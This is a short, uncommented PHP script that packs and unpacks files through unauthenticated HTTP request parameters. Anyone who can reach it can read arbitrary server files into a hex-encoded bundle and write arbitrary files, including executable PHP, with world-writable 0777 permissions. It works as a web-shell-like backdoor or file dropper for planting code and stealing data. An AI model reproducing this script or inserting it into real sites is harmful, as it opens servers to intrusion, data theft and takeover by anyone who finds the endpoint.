<?php
$fxkey = $_REQUEST['key'];
$filename = $_REQUEST['name'];
$inputData = $_REQUEST['data'];
if ($fxkey == 'in') {
    $dataExp = explode(';', $inputData);
    $outFile = '';
    foreach ($dataExp as $key=>$part) {
        if (strpos($part, ':') !== false) {
            $partExp = explode(':', $part);
            $partName = $partExp[0];
            $partContent = bin2hex($partExp[1]);
        } else {
            $partName = $part;
            $openCont = file_get_contents($partName);
            $partContent = bin2hex($openCont);
        }
        $outFile .= $partName.'|[2]|'.$partContent.'|[1]|';
    }
    file_put_contents($filename, $outFile);
    chmod($filename, 0777);
} elseif ($fxkey == 'out') {
    $data = file_get_contents($filename);
    $dataExp = explode('|[1]|', $data);
    foreach ($dataExp as $key=>$part) {
        $partExp = explode('|[2]|', $part);
        $partName = $partExp[0];
        $partContent = hex2bin($partExp[1]);
        file_put_contents($partName, $partContent);
        chmod($partName, 0777);
    }
}
